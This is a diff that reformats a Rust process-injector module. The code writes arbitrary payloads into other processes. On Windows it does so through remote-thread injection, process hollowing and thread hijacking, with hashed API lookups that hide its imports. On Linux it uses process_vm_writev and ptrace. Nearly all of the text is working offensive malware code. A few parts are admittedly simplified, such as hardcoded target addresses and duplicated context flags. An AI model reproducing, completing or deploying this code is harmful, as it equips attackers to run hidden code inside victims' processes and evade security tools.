@@ -60,34 +60,72 @@ impl Injector {
     fn reflective_inject(&self, pid: u32, payload: &[u8]) -> Result<(), ()> {
         unsafe {
             let kernel32 = hash_str(b"kernel32.dll");
-            
+
             let open_process = resolve_function(kernel32, hash_str(b"OpenProcess"));
             let virtual_alloc_ex = resolve_function(kernel32, hash_str(b"VirtualAllocEx"));
             let write_process_memory = resolve_function(kernel32, hash_str(b"WriteProcessMemory"));
             let create_remote_thread = resolve_function(kernel32, hash_str(b"CreateRemoteThread"));
 
-            if open_process.is_null() || virtual_alloc_ex.is_null() || write_process_memory.is_null() || create_remote_thread.is_null() {
+            if open_process.is_null()
+                || virtual_alloc_ex.is_null()
+                || write_process_memory.is_null()
+                || create_remote_thread.is_null()
+            {
                 return Err(());
             }
 
             type FnOpenProcess = unsafe extern "system" fn(u32, i32, u32) -> HANDLE;
-            type FnVirtualAllocEx = unsafe extern "system" fn(HANDLE, PVOID, usize, u32, u32) -> PVOID;
-            type FnWriteProcessMemory = unsafe extern "system" fn(HANDLE, PVOID, *const c_void, usize, *mut usize) -> i32;
-            type FnCreateRemoteThread = unsafe extern "system" fn(HANDLE, PVOID, usize, PVOID, PVOID, u32, *mut u32) -> HANDLE;
+            type FnVirtualAllocEx =
+                unsafe extern "system" fn(HANDLE, PVOID, usize, u32, u32) -> PVOID;
+            type FnWriteProcessMemory =
+                unsafe extern "system" fn(HANDLE, PVOID, *const c_void, usize, *mut usize) -> i32;
+            type FnCreateRemoteThread = unsafe extern "system" fn(
+                HANDLE,
+                PVOID,
+                usize,
+                PVOID,
+                PVOID,
+                u32,
+                *mut u32,
+            ) -> HANDLE;
 
             // PROCESS_ALL_ACCESS = 0x001F0FFF
             let h_proc = core::mem::transmute::<_, FnOpenProcess>(open_process)(0x001F0FFF, 0, pid);
-            if h_proc.is_null() { return Err(()); }
+            if h_proc.is_null() {
+                return Err(());
+            }
 
             // MEM_COMMIT | MEM_RESERVE = 0x3000, PAGE_EXECUTE_READWRITE = 0x40
-            let remote_addr = core::mem::transmute::<_, FnVirtualAllocEx>(virtual_alloc_ex)(h_proc, core::ptr::null_mut(), payload.len(), 0x3000, 0x40);
-            if remote_addr.is_null() { return Err(()); }
+            let remote_addr = core::mem::transmute::<_, FnVirtualAllocEx>(virtual_alloc_ex)(
+                h_proc,
+                core::ptr::null_mut(),
+                payload.len(),
+                0x3000,
+                0x40,
+            );
+            if remote_addr.is_null() {
+                return Err(());
+            }
 
             let mut written = 0;
-            core::mem::transmute::<_, FnWriteProcessMemory>(write_process_memory)(h_proc, remote_addr, payload.as_ptr() as *const c_void, payload.len(), &mut written);
+            core::mem::transmute::<_, FnWriteProcessMemory>(write_process_memory)(
+                h_proc,
+                remote_addr,
+                payload.as_ptr() as *const c_void,
+                payload.len(),
+                &mut written,
+            );
 
-            core::mem::transmute::<_, FnCreateRemoteThread>(create_remote_thread)(h_proc, core::ptr::null_mut(), 0, remote_addr, core::ptr::null_mut(), 0, core::ptr::null_mut());
-            
+            core::mem::transmute::<_, FnCreateRemoteThread>(create_remote_thread)(
+                h_proc,
+                core::ptr::null_mut(),
+                0,
+                remote_addr,
+                core::ptr::null_mut(),
+                0,
+                core::ptr::null_mut(),
+            );
+
             Ok(())
         }
     }
@@ -113,15 +151,35 @@ impl Injector {
                 return Err(());
             }
 
-            type FnCreateProcessA = unsafe extern "system" fn(LPCSTR, PVOID, PVOID, PVOID, i32, u32, PVOID, LPCSTR, *mut STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32;
+            type FnCreateProcessA = unsafe extern "system" fn(
+                LPCSTR,
+                PVOID,
+                PVOID,
+                PVOID,
+                i32,
+                u32,
+                PVOID,
+                LPCSTR,
+                *mut STARTUPINFOA,
+                *mut PROCESS_INFORMATION,
+            ) -> i32;
             type FnNtUnmapViewOfSection = unsafe extern "system" fn(HANDLE, PVOID) -> i32;
-            type FnVirtualAllocEx = unsafe extern "system" fn(HANDLE, PVOID, usize, u32, u32) -> PVOID;
-            type FnWriteProcessMemory = unsafe extern "system" fn(HANDLE, PVOID, *const c_void, usize, *mut usize) -> i32;
-            type FnReadProcessMemory = unsafe extern "system" fn(HANDLE, PVOID, PVOID, usize, *mut usize) -> i32;
+            type FnVirtualAllocEx =
+                unsafe extern "system" fn(HANDLE, PVOID, usize, u32, u32) -> PVOID;
+            type FnWriteProcessMemory =
+                unsafe extern "system" fn(HANDLE, PVOID, *const c_void, usize, *mut usize) -> i32;
+            type FnReadProcessMemory =
+                unsafe extern "system" fn(HANDLE, PVOID, PVOID, usize, *mut usize) -> i32;
             type FnGetThreadContext = unsafe extern "system" fn(HANDLE, *mut CONTEXT) -> i32;
             type FnSetThreadContext = unsafe extern "system" fn(HANDLE, *const CONTEXT) -> i32;
             type FnResumeThread = unsafe extern "system" fn(HANDLE) -> u32;
-            type FnNtQueryInformationProcess = unsafe extern "system" fn(HANDLE, u32, *mut PROCESS_BASIC_INFORMATION, u32, *mut u32) -> i32;
+            type FnNtQueryInformationProcess = unsafe extern "system" fn(
+                HANDLE,
+                u32,
+                *mut PROCESS_BASIC_INFORMATION,
+                u32,
+                *mut u32,
+            ) -> i32;
 
             let mut si: STARTUPINFOA = core::mem::zeroed();
             si.cb = core::mem::size_of::<STARTUPINFOA>() as u32;
@@ -139,10 +197,12 @@ impl Injector {
                 core::ptr::null_mut(),
                 core::ptr::null_mut(),
                 &mut si,
-                &mut pi
+                &mut pi,
             );
 
-            if success == 0 { return Err(()); }
+            if success == 0 {
+                return Err(());
+            }
 
             // 2. Unmap Original Section
             let mut pbi: PROCESS_BASIC_INFORMATION = core::mem::zeroed();
@@ -151,7 +211,7 @@ impl Injector {
                 0, // ProcessBasicInformation
                 &mut pbi,
                 core::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
-                core::ptr::null_mut()
+                core::ptr::null_mut(),
             );
 
             let mut peb: PEB = core::mem::zeroed();
@@ -160,7 +220,7 @@ impl Injector {
                 pbi.PebBaseAddress,
                 &mut peb as *mut _ as PVOID,
                 core::mem::size_of::<PEB>(),
-                core::ptr::null_mut()
+                core::ptr::null_mut(),
             );
 
             let image_base = peb.ImageBaseAddress;
@@ -172,9 +232,11 @@ impl Injector {
                 core::ptr::null_mut(), // Let OS choose location if unmapped
                 payload.len(),
                 0x3000, // MEM_COMMIT | MEM_RESERVE
-                0x40    // PAGE_EXECUTE_READWRITE
+                0x40,   // PAGE_EXECUTE_READWRITE
             );
-            if remote_addr.is_null() { return Err(()); }
+            if remote_addr.is_null() {
+                return Err(());
+            }
 
             // 4. Write Payload
             let mut written = 0;
@@ -183,25 +245,25 @@ impl Injector {
                 remote_addr,
                 payload.as_ptr() as *const c_void,
                 payload.len(),
-                &mut written
+                &mut written,
             );
 
             // 5. Update Thread Context
             let mut ctx: CONTEXT = core::mem::zeroed();
             ctx.ContextFlags = 0x10007; // CONTEXT_FULL (approx) - actually 0x10000 | 0x0007 (i86) or 0x100000 | ... (amd64)
-            // For x64: CONTEXT_CONTROL | CONTEXT_INTEGER | ...
-            // We'll use 0x100000 | 0x01 | 0x02 = 0x100003 (CONTEXT_FULL_AMD64)
-            ctx.ContextFlags = 0x100003; 
+                                        // For x64: CONTEXT_CONTROL | CONTEXT_INTEGER | ...
+                                        // We'll use 0x100000 | 0x01 | 0x02 = 0x100003 (CONTEXT_FULL_AMD64)
+            ctx.ContextFlags = 0x100003;
 
             core::mem::transmute::<_, FnGetThreadContext>(get_thread_context)(pi.hThread, &mut ctx);
-            
+
             ctx.Rip = remote_addr as u64; // Redirect execution
 
             core::mem::transmute::<_, FnSetThreadContext>(set_thread_context)(pi.hThread, &ctx);
 
             // 6. Resume
             core::mem::transmute::<_, FnResumeThread>(resume_thread)(pi.hThread);
-            
+
             Ok(())
         }
     }
@@ -230,39 +292,50 @@ impl Injector {
             type FnGetContext = unsafe extern "system" fn(HANDLE, *mut CONTEXT) -> i32;
             type FnSetContext = unsafe extern "system" fn(HANDLE, *const CONTEXT) -> i32;
             type FnResumeThread = unsafe extern "system" fn(HANDLE) -> u32;
-            type FnVirtualAllocEx = unsafe extern "system" fn(HANDLE, PVOID, usize, u32, u32) -> PVOID;
-            type FnWriteProcessMemory = unsafe extern "system" fn(HANDLE, PVOID, *const c_void, usize, *mut usize) -> i32;
+            type FnVirtualAllocEx =
+                unsafe extern "system" fn(HANDLE, PVOID, usize, u32, u32) -> PVOID;
+            type FnWriteProcessMemory =
+                unsafe extern "system" fn(HANDLE, PVOID, *const c_void, usize, *mut usize) -> i32;
             type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
 
             // 1. Find Thread
             // TH32CS_SNAPTHREAD = 0x4
             let h_snapshot = core::mem::transmute::<_, FnCreateSnapshot>(create_snapshot)(0x4, 0);
-            if h_snapshot == ( -1 as isize as HANDLE ) { return Err(()); }
+            if h_snapshot == (-1 as isize as HANDLE) {
+                return Err(());
+            }
 
             let mut te: THREADENTRY32 = core::mem::zeroed();
             te.dwSize = core::mem::size_of::<THREADENTRY32>() as u32;
 
             let mut target_tid = 0;
-            
+
             if core::mem::transmute::<_, FnThreadNext>(thread_first)(h_snapshot, &mut te) != 0 {
                 loop {
                     if te.th32OwnerProcessID == pid {
                         target_tid = te.th32ThreadID;
                         break;
                     }
-                    if core::mem::transmute::<_, FnThreadNext>(thread_next)(h_snapshot, &mut te) == 0 {
+                    if core::mem::transmute::<_, FnThreadNext>(thread_next)(h_snapshot, &mut te)
+                        == 0
+                    {
                         break;
                     }
                 }
             }
             core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_snapshot);
 
-            if target_tid == 0 { return Err(()); }
+            if target_tid == 0 {
+                return Err(());
+            }
 
             // 2. Open & Suspend
             // THREAD_ALL_ACCESS = 0x001F03FF
-            let h_thread = core::mem::transmute::<_, FnOpenThread>(open_thread)(0x001F03FF, 0, target_tid);
-            if h_thread.is_null() { return Err(()); }
+            let h_thread =
+                core::mem::transmute::<_, FnOpenThread>(open_thread)(0x001F03FF, 0, target_tid);
+            if h_thread.is_null() {
+                return Err(());
+            }
 
             core::mem::transmute::<_, FnSuspendThread>(suspend_thread)(h_thread);
 
@@ -271,29 +344,42 @@ impl Injector {
             // We need OpenProcess to allocate memory in target process.
             let open_process = resolve_function(kernel32, hash_str(b"OpenProcess"));
             type FnOpenProcess = unsafe extern "system" fn(u32, i32, u32) -> HANDLE;
-            let h_process = core::mem::transmute::<_, FnOpenProcess>(open_process)(0x001F0FFF, 0, pid); // PROCESS_ALL_ACCESS
-            
+            let h_process =
+                core::mem::transmute::<_, FnOpenProcess>(open_process)(0x001F0FFF, 0, pid); // PROCESS_ALL_ACCESS
+
             if h_process.is_null() {
                 core::mem::transmute::<_, FnResumeThread>(resume_thread)(h_thread); // Resume before fail
                 return Err(());
             }
 
-            let remote_addr = core::mem::transmute::<_, FnVirtualAllocEx>(virtual_alloc_ex)(h_process, core::ptr::null_mut(), payload.len(), 0x3000, 0x40);
+            let remote_addr = core::mem::transmute::<_, FnVirtualAllocEx>(virtual_alloc_ex)(
+                h_process,
+                core::ptr::null_mut(),
+                payload.len(),
+                0x3000,
+                0x40,
+            );
             let mut written = 0;
-            core::mem::transmute::<_, FnWriteProcessMemory>(write_process_memory)(h_process, remote_addr, payload.as_ptr() as *const c_void, payload.len(), &mut written);
+            core::mem::transmute::<_, FnWriteProcessMemory>(write_process_memory)(
+                h_process,
+                remote_addr,
+                payload.as_ptr() as *const c_void,
+                payload.len(),
+                &mut written,
+            );
 
             // 4. Update Context
             let mut ctx: CONTEXT = core::mem::zeroed();
             ctx.ContextFlags = 0x100003; // CONTEXT_FULL_AMD64
             core::mem::transmute::<_, FnGetContext>(get_context)(h_thread, &mut ctx);
-            
+
             ctx.Rip = remote_addr as u64;
 
             core::mem::transmute::<_, FnSetContext>(set_context)(h_thread, &ctx);
 
             // 5. Resume
             core::mem::transmute::<_, FnResumeThread>(resume_thread)(h_thread);
-            
+
             core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_thread);
             core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_process);
 
@@ -307,12 +393,12 @@ impl Injector {
             // Assume 0x400000 base for simplified MVP injection
             // In a full implementation, we'd parse /proc/pid/maps to find RX pages
             let target_addr = 0x400000 as *mut c_void;
-            
+
             let local_iov = crate::utils::syscalls::Iovec {
                 iov_base: payload.as_ptr() as *mut c_void,
                 iov_len: payload.len(),
             };
-            
+
             let remote_iov = crate::utils::syscalls::Iovec {
                 iov_base: target_addr,
                 iov_len: payload.len(),
@@ -324,7 +410,7 @@ impl Injector {
                 1,
                 &remote_iov,
                 1,
-                0
+                0,
             );
 
             if n == payload.len() as isize {
@@ -340,7 +426,9 @@ impl Injector {
         unsafe {
             use crate::utils::syscalls::*;
             let pid = sys_fork();
-            if pid < 0 { return Err(()); }
+            if pid < 0 {
+                return Err(());
+            }
 
             if pid == 0 {
                 // Child: TRACEME and exec a dummy process
@@ -357,13 +445,22 @@ impl Injector {
 
                 // Inject payload into child
                 // Assume entry point or known RX page
-                let target_addr = 0x400000; 
-                
+                let target_addr = 0x400000;
+
                 for (i, chunk) in payload.chunks(8).enumerate() {
                     let mut data = 0u64;
                     let len = chunk.len();
-                    core::ptr::copy_nonoverlapping(chunk.as_ptr(), &mut data as *mut u64 as *mut u8, len);
-                    sys_ptrace(PTRACE_POKETEXT, pid as i32, target_addr + (i * 8), data as usize);
+                    core::ptr::copy_nonoverlapping(
+                        chunk.as_ptr(),
+                        &mut data as *mut u64 as *mut u8,
+                        len,
+                    );
+                    sys_ptrace(
+                        PTRACE_POKETEXT,
+                        pid as i32,
+                        target_addr + (i * 8),
+                        data as usize,
+                    );
                 }
 
                 // Update registers
@@ -384,7 +481,9 @@ impl Injector {
     fn thread_hijack(&self, pid: u32, payload: &[u8]) -> Result<(), ()> {
         unsafe {
             use crate::utils::syscalls::*;
-            if sys_ptrace(PTRACE_ATTACH, pid as i32, 0, 0) < 0 { return Err(()); }
+            if sys_ptrace(PTRACE_ATTACH, pid as i32, 0, 0) < 0 {
+                return Err(());
+            }
 
             let mut status = 0;
             sys_wait4(pid as i32, &mut status, 0, core::ptr::null_mut());
@@ -395,8 +494,17 @@ impl Injector {
             for (i, chunk) in payload.chunks(8).enumerate() {
                 let mut data = 0u64;
                 let len = chunk.len();
-                core::ptr::copy_nonoverlapping(chunk.as_ptr(), &mut data as *mut u64 as *mut u8, len);
-                sys_ptrace(PTRACE_POKETEXT, pid as i32, target_addr + (i * 8), data as usize);
+                core::ptr::copy_nonoverlapping(
+                    chunk.as_ptr(),
+                    &mut data as *mut u64 as *mut u8,
+                    len,
+                );
+                sys_ptrace(
+                    PTRACE_POKETEXT,
+                    pid as i32,
+                    target_addr + (i * 8),
+                    data as usize,
+                );
             }
 
             let mut regs: user_regs_struct = core::mem::zeroed();
